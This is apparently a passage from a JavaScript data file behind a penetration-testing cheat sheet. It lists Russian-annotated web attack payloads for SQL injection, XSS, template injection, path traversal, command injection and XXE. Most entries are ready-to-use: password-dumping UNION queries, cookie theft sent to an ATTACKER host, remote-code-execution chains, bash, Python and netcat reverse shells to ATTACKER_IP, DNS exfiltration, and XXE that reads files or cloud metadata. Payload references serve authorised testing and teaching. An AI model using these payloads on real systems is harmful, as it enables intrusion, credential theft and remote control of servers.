    { id:"sqli-2",  catId:"sqli", title:"Auth bypass — admin",        desc:"Комментирует хвост запроса, позволяя войти как admin без пароля.", payload:`admin'--`,                  note:"Вариант: admin'#  (MySQL)" },
    { id:"sqli-3",  catId:"sqli", title:"Auth bypass — всегда true",  desc:"Классика через #-комментарий (MySQL).", payload:`' OR 1=1#`,                  note:"# работает в MySQL, -- в большинстве остальных СУБД" },
    { id:"sqli-4",  catId:"sqli", title:"UNION — определить кол-во столбцов", desc:"Увеличивайте число NULL до исчезновения ошибки — это количество столбцов.", payload:`' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--`,  note:"Когда получите ошибку — предыдущее число = кол-во столбцов" },
    { id:"sqli-5",  catId:"sqli", title:"UNION SELECT — извлечь данные", desc:"Подставьте правильное число столбцов. Цифры покажут, какие выводятся.", payload:`' UNION SELECT NULL,NULL,NULL--\n' UNION SELECT 1,2,3--`, note:"Один из столбцов должен быть текстовым для вывода строк" },
    { id:"sqli-6",  catId:"sqli", title:"UNION — версия БД",          desc:"Получить версию СУБД через UNION.", payload:`' UNION SELECT version(),NULL--\n' UNION SELECT @@version,NULL--`, note:"MySQL/MariaDB: version(), MSSQL: @@version, Oracle: v$version" },
    { id:"sqli-7",  catId:"sqli", title:"UNION — список таблиц",      desc:"Получить все таблицы из information_schema.", payload:`' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--`, note:"Oracle: FROM all_tables WHERE owner='PUBLIC'" },
    { id:"sqli-8",  catId:"sqli", title:"UNION — столбцы таблицы",    desc:"Получить столбцы конкретной таблицы.", payload:`' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--`, note:"Замените 'users' на нужную таблицу" },
    { id:"sqli-9",  catId:"sqli", title:"UNION — дамп пользователей", desc:"Извлечь логины и пароли из таблицы users.", payload:`' UNION SELECT username,password FROM users--`, note:"Названия столбцов могут отличаться: login/pass, email/hash и т.д." },
    { id:"sqli-10", catId:"sqli", title:"Error-based (MySQL)",         desc:"Вывод данных через сообщение об ошибке MySQL.", payload:`' AND extractvalue(1,concat(0x7e,version()))--\n' AND updatexml(1,concat(0x7e,database()),1)--`, note:"Работает если приложение отображает ошибки MySQL" },
    { id:"sqli-11", catId:"sqli", title:"Blind time-based (MySQL)",    desc:"Задержка 5 сек подтверждает уязвимость при слепой инъекции.", payload:`' AND SLEEP(5)--\n' AND IF(1=1,SLEEP(5),0)--`, note:"MSSQL: WAITFOR DELAY '0:0:5'  |  PostgreSQL: pg_sleep(5)" },
    { id:"sqli-12", catId:"sqli", title:"Boolean blind — true/false",  desc:"Сравните ответы: одинаковые → false, разные → true. Основа слепой инъекции.", payload:`' AND 1=1--\n' AND 1=2--`, note:"Если страницы отличаются — булевая слепая инъекция работает" },
    { id:"sqli-13", catId:"sqli", title:"Bypass WAF — пробелы",        desc:"Обход фильтрации пробелов и ключевых слов.", payload:`'/**/OR/**/1=1--\n' UNION/**/SELECT/**/NULL--\n'%09OR%091=1--`, note:"%09=tab, /**/ = comment, можно также: %0a %0d %0c %0b" },

    // ── XSS ──────────────────────────────────────────────────
    { id:"xss-1",  catId:"xss", title:"Script tag — базовый",         desc:"Классический XSS через тег script.", payload:`<script>alert(document.domain)</script>`, note:"Используйте document.domain вместо 1 — докажет контекст исполнения" },
    { id:"xss-2",  catId:"xss", title:"img onerror",                   desc:"Срабатывает даже при фильтрации script. src=x вызывает ошибку загрузки.", payload:`<img src=x onerror=alert(document.cookie)>`, note:"Для кражи cookie замените alert() на fetch к вашему серверу" },
    { id:"xss-3",  catId:"xss", title:"SVG onload",                    desc:"SVG-тег обрабатывается как HTML и поддерживает события.", payload:`<svg onload=alert(1)>`, note:"Работает там, где фильтруется script, но разрешён SVG" },
    { id:"xss-4",  catId:"xss", title:"Bypass фильтра — смешанный регистр", desc:"Многие фильтры ищут точное совпадение 'script'.", payload:`<ScRiPt>alert(1)</ScRiPt>`, note:"HTML регистронезависим для тегов, но фильтры — нет" },
    { id:"xss-5",  catId:"xss", title:"Атрибут — событие мыши",       desc:"Инъекция в value/href атрибут с выходом через кавычку.", payload:`" onmouseover="alert(1)\n' onfocus='alert(1)' autofocus='`, note:"Подбирайте кавычку под контекст: одинарная или двойная" },
    { id:"xss-6",  catId:"xss", title:"javascript: URI",              desc:"Для href и src атрибутов. Исполняется при переходе по ссылке.", payload:`javascript:alert(document.cookie)`, note:"Часто блокируется CSP. Работает в href=, action=, src=" },
    { id:"xss-7",  catId:"xss", title:"Кража cookie через fetch",     desc:"Отправляет куки на сервер атакующего. Замените URL на ваш.", payload:`<img src=x onerror="fetch('https://ATTACKER/?c='+btoa(document.cookie))">`, note:"Нужен CORS-разрешающий сервер: nc -lvnp 80 или RequestBin" },
    { id:"xss-8",  catId:"xss", title:"innerHTML XSS",                desc:"Если данные вставляются через innerHTML — script не выполнится, но img/svg сработают.", payload:`<img src=1 onerror=alert(1)>\n<svg/onload=alert(1)>`, note:"script в innerHTML не выполняется — используйте обработчики событий" },
    { id:"xss-9",  catId:"xss", title:"Polyglot",                     desc:"Один пейлоад работает во многих контекстах: HTML, JS, атрибут.", payload:`jaVasCript:/*-/*\`/*\\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e`, note:"Polyglot для тестирования нескольких векторов одним запросом" },
    { id:"xss-10", catId:"xss", title:"CSP bypass — нет unsafe-inline", desc:"Если CSP запрещает inline — ищите разрешённые домены с JSONP или открытым редиректом.", payload:`<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>`, note:"Ищите JSONP endpoints на разрешённых CSP доменах" },

    // ── SSTI ─────────────────────────────────────────────────
    { id:"ssti-1",  catId:"ssti", title:"Определение — умножение",    desc:"Если вернулось 49 → шаблонизатор обрабатывает выражение. Первый шаг диагностики.", payload:`{{7*7}}\n\${7*7}\n<%= 7*7 %>\n#{7*7}\n*{7*7}`, note:"Jinja2/Twig: {{7*7}}=49  |  Jinja2 vs Twig: {{7*'7'}} → 49 vs 7777777" },
    { id:"ssti-2",  catId:"ssti", title:"Jinja2 — конфиг приложения", desc:"Выводит Flask/Django конфиг, включая SECRET_KEY.", payload:`{{config}}\n{{config.items()}}`, note:"Работает только в Flask/Jinja2 — глобальный объект config" },
    { id:"ssti-3",  catId:"ssti", title:"Jinja2 — RCE через subclasses", desc:"Классическая цепочка через Python object hierarchy для выполнения команд.", payload:`{{''.__class__.__mro__[1].__subclasses__()}}\n{{''.__class__.__mro__[1].__subclasses__()[439]('id',shell=True,stdout=-1).communicate()[0].strip()}}`, note:"Индекс 439 может отличаться — найдите subprocess.Popen через поиск по списку" },
    { id:"ssti-4",  catId:"ssti", title:"Jinja2 — RCE через request",  desc:"Более чистый вариант RCE через globals/builtins (Flask).", payload:`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`, note:"Требует доступа к объекту request (Flask)" },
    { id:"ssti-5",  catId:"ssti", title:"Jinja2 — обход фильтров",     desc:"Обход фильтрации символов _ и . через attr() и запросы атрибутов.", payload:`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}`, note:"\\x5f = '_' — обход WAF-фильтрации подчёркиваний" },
    { id:"ssti-6",  catId:"ssti", title:"Twig — RCE",                  desc:"RCE в Twig (PHP) через registerUndefinedFilterCallback.", payload:`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`, note:"Работает в Twig 1.x. В Twig 3+ этот метод удалён" },
    { id:"ssti-7",  catId:"ssti", title:"Freemarker — RCE",            desc:"RCE в Freemarker (Java) через Execute.", payload:`<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`, note:"Работает если политика безопасности Freemarker не ограничена" },
    { id:"ssti-8",  catId:"ssti", title:"ERB (Ruby) — RCE",            desc:"RCE в ERB-шаблонах Ruby on Rails.", payload:`<%= system("id") %>\n<%= \`id\` %>`, note:"ERB используется в Rails views. Также: IO.popen('id').read" },
    { id:"ssti-9",  catId:"ssti", title:"Velocity (Java) — RCE",       desc:"RCE в Apache Velocity через Runtime.exec().", payload:`#set($e="e")\n#set($r=$e.class.forName("java.lang.Runtime"))\n#set($ex=$r.getRuntime().exec("id"))\n#set($sc=$ex.getInputStream())\n#set($result="")$result.getClass().forName("java.util.Scanner").getDeclaredConstructors()[0].newInstance($sc).useDelimiter("\\\\A").next()`, note:"Velocity часто встречается в корпоративных Java-приложениях" },

    // ── LFI / Path Traversal ─────────────────────────────────
    { id:"lfi-1",  catId:"lfi", title:"Базовый traversal (Unix)",      desc:"Классический обход пути для чтения /etc/passwd.", payload:`../../../etc/passwd\n../../../../etc/passwd\n../../../../../etc/passwd`, note:"Подбирайте глубину (..) пока не найдёте файл" },
    { id:"lfi-2",  catId:"lfi", title:"Traversal (Windows)",           desc:"Обход пути на Windows-сервере.", payload:`..\\..\\..\windows\win.ini\n..\\..\\..\\windows\\system32\\drivers\\etc\\hosts`, note:"Попробуйте оба слеша: \\ и / — IIS принимает оба" },
    { id:"lfi-3",  catId:"lfi", title:"URL-encoding bypass",           desc:"Обход фильтрации ../ через двойное URL-кодирование.", payload:`..%2f..%2f..%2fetc%2fpasswd\n%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\n..%252f..%252f..%252fetc%252fpasswd`, note:"Одинарный encode: %2f  |  Двойной: %252f  |  Unicode: %c0%af" },
    { id:"lfi-4",  catId:"lfi", title:"PHP filter — исходный код",     desc:"Читает исходный PHP-файл в base64 обходя интерпретацию.", payload:`php://filter/convert.base64-encode/resource=index.php\nphp://filter/read=convert.base64-encode/resource=../config.php`, note:"Декодируйте полученный base64: base64 -d или python3 base64.b64decode()" },
    { id:"lfi-5",  catId:"lfi", title:"PHP input — код в запросе",     desc:"Выполняет PHP-код из тела POST-запроса.", payload:`php://input`, note:"В теле POST: <?php system($_GET['cmd']); ?>  Тогда: ?file=php://input&cmd=id" },
    { id:"lfi-6",  catId:"lfi", title:"Log poisoning — RCE",           desc:"Записываем PHP-код в лог, потом включаем лог через LFI.", payload:`/var/log/apache2/access.log\n/var/log/nginx/access.log\n/var/log/auth.log\n/proc/self/fd/2`, note:"Сначала отправьте: curl -H 'User-Agent: <?php system($_GET[cmd]); ?>' URL" },
    { id:"lfi-7",  catId:"lfi", title:"Интересные файлы (Linux)",      desc:"Самые ценные файлы для чтения через LFI.", payload:`/etc/passwd\n/etc/shadow\n/etc/hosts\n/etc/crontab\n/home/[user]/.ssh/id_rsa\n/proc/self/environ\n/proc/self/cmdline\n/var/www/html/config.php`, note:"/etc/shadow требует root-привилегий веб-сервера" },
    { id:"lfi-8",  catId:"lfi", title:"Null byte (PHP < 5.3)",         desc:"В старых версиях PHP null byte обрывал строку, убирая добавляемое расширение.", payload:`../../../etc/passwd%00\n../../../etc/passwd\x00`, note:"Патч в PHP 5.3.4 — работает только на старых системах" },

    // ── Command Injection ────────────────────────────────────
    { id:"cmdi-1",  catId:"cmdi", title:"Базовые разделители",         desc:"Попробуйте все разделители — разные ОС и парсеры обрабатывают их по-разному.", payload:`; id\n| id\n&& id\n|| id\n\`id\`\n$(id)`, note:"Начните с ; затем |. В Windows: & id  |  &&  cmd /c id" },
    { id:"cmdi-2",  catId:"cmdi", title:"Слепая — задержка",           desc:"Если вывода нет — задержка доказывает выполнение команды.", payload:`; sleep 5\n| timeout /T 5\n$(sleep 5)\n& ping -n 5 127.0.0.1`, note:"Linux: sleep 5  |  Windows: timeout /T 5 или ping -n 5" },
    { id:"cmdi-3",  catId:"cmdi", title:"Out-of-band — DNS",           desc:"Получите данные через DNS-запрос к вашему серверу (Burp Collaborator, interactsh).", payload:"nslookup `id`.ATTACKER.com\ncurl http://$(id).ATTACKER.com/\nping -c 1 $(whoami).ATTACKER.com", note:"Используйте Burp Collaborator или: python3 -m dnslib.server" },
    { id:"cmdi-4",  catId:"cmdi", title:"Bypass фильтра пробелов",     desc:"Замените пробел на IFS, tab или ${IFS} для обхода фильтрации.", payload:`\${IFS}id\n;id%09\n;{id}`, note:"$IFS = Internal Field Separator (пробел/tab/newline). %09 = tab в URL" },
    { id:"cmdi-5",  catId:"cmdi", title:"Reverse shell — bash",        desc:"Классический bash reverse shell. Замените IP и порт.", payload:"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'", note:"На атакующей машине: nc -lvnp 4444" },
    { id:"cmdi-6",  catId:"cmdi", title:"Reverse shell — Python",      desc:"Python reverse shell — работает там где нет bash.", payload:"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\"])'", note:"Python2: заменить python3 на python" },
    { id:"cmdi-7",  catId:"cmdi", title:"Reverse shell — netcat",      desc:"Netcat reverse shell. -e доступен не везде.", payload:"nc -e /bin/bash ATTACKER_IP 4444\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444>/tmp/f", note:"Второй вариант работает на busybox nc без флага -e" },
    { id:"cmdi-8",  catId:"cmdi", title:"Bypass WAF — кодирование",    desc:"Обход фильтрации команд через кодирование и переменные.", payload:"$(printf '\\x69\\x64')\necho 'aWQ=' | base64 -d | bash\ni''d\ni$@d", note:"aWQ= = base64('id'). Разбивка строки через '' или пустые переменные" },

    // ── XXE ──────────────────────────────────────────────────
    { id:"xxe-1",  catId:"xxe", title:"Базовый — чтение файла",        desc:"Читает /etc/passwd через XML External Entity.", payload:`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`, note:"Подставьте в XML-тело запроса. Работает если парсер разрешает external entities" },
    { id:"xxe-2",  catId:"xxe", title:"SSRF через XXE",                desc:"Делает HTTP-запрос к внутреннему сервису с сервера.", payload:`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>`, note:"169.254.169.254 = AWS/GCP/Azure metadata endpoint. Замените на внутренний IP" },
    { id:"xxe-3",  catId:"xxe", title:"PHP filter через XXE",          desc:"Читает исходный PHP-код через php://filter wrapper.", payload:`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<foo>&xxe;</foo>`, note:"Работает только на PHP-серверах с PHP stream wrappers" },
    { id:"xxe-4",  catId:"xxe", title:"Blind XXE — out-of-band",       desc:"Для слепого XXE: сервер делает запрос к вашему DTD-файлу.", payload:`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">
  %xxe;
]>
<foo/>

<!-- evil.dtd содержит: -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % out "<!ENTITY exfil SYSTEM 'http://ATTACKER/?x=%data;'>">
%out;
&exfil;`, note:"Хостите evil.dtd на своём сервере с python3 -m http.server" },
    { id:"xxe-5",  catId:"xxe", title:"Windows — чтение файла",        desc:"Читает файл на Windows-сервере.", payload:`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>`, note:"Используйте file:/// с тремя слешами для абсолютного пути" },
  ],

};
